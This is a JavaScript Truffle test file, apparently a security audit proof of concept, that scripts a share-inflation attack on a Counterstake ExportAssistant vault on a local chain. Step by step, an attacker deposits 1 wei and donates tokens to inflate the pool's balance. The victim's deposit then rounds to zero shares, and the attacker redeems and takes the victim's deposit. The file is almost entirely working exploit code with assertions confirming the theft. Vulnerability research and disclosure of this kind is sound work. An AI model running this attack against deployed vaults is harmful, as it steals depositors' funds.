require('@openzeppelin/test-helpers/configure')({
	provider: 'http://localhost:7545',
});

const Export = artifacts.require("Export");
const Oracle = artifacts.require("Oracle");
const Token = artifacts.require("BadToken");
const CounterstakeFactory = artifacts.require("CounterstakeFactory");
const AssistantFactory = artifacts.require("AssistantFactory");
const ExportAssistant = artifacts.require("ExportAssistant");
const { BN, ether, constants } = require('@openzeppelin/test-helpers');
const { expect } = require('chai');

contract("PoC: vault share inflation", accounts => {
	const attacker = accounts[1];
	const victim = accounts[2];

	let token, assistant;

	before(async () => {
		/// deploy test token, mint to attacker & victim
		token = await Token.new("Test", "TST");
		await token.mint(attacker, ether('100'));
		await token.mint(victim, ether('100'));

		/// deploy oracle with a valid price (required by initExportAssistant)
		const oracle = await Oracle.new();
		await oracle.setPrice("_NATIVE_", "TST", new BN(1), new BN(1));

		/// create export bridge via factory
		const factory = await CounterstakeFactory.deployed();
		let res = await factory.createExport("Obyte", "TST", token.address, 150, 100, ether('100'),
			[12 * 3600], [3 * 24 * 3600]);
		const bridge = await Export.at(res.logs[0].args.contractAddress);

		/// create assistant via factory, exponent=1, zero fees for clean math
		const assistantFactory = await AssistantFactory.deployed();
		res = await assistantFactory.createExportAssistant(
			bridge.address, constants.ZERO_ADDRESS, 0, 0, oracle.address, 1, "POC", "POC"
		);
		assistant = await ExportAssistant.at(res.logs[0].args.contractAddress);

		/// approve assistant to spend tokens
		await token.approve(assistant.address, ether('100'), { from: attacker });
		await token.approve(assistant.address, ether('100'), { from: victim });
	});

	it("attacker steals victim deposit via share inflation", async () => {
		const D = ether('10');
		const V = ether('9');

		const attackerBefore = await token.balanceOf(attacker);

		/// step 1: attacker deposits 1 wei, gets 1 share
		await assistant.buyShares(new BN(1), { from: attacker });
		expect(await assistant.balanceOf(attacker)).to.be.bignumber.equal(new BN(1));

		/// step 2: attacker donates D directly to inflate getGrossBalance
		await token.transfer(assistant.address, D, { from: attacker });

		/// step 3: victim deposits V, gets 0 shares (integer floor)
		await assistant.buyShares(V, { from: victim });
		expect(await assistant.balanceOf(victim)).to.be.bignumber.equal(new BN(0));

		/// step 4: attacker redeems 1 share, drains entire pool
		await assistant.redeemShares(new BN(1), { from: attacker });
		expect(await assistant.balanceOf(attacker)).to.be.bignumber.equal(new BN(0));

		const attackerAfter = await token.balanceOf(attacker);
		const profit = attackerAfter.sub(attackerBefore);

		/// attacker gained the victim's full deposit
		expect(attackerAfter).to.be.bignumber.gt(attackerBefore);
		expect(profit).to.be.bignumber.equal(V);

		/// victim has 0 shares, lost V tokens
		expect(await assistant.balanceOf(victim)).to.be.bignumber.equal(new BN(0));
		expect(await token.balanceOf(victim)).to.be.bignumber.equal(ether('100').sub(V));
	});
});
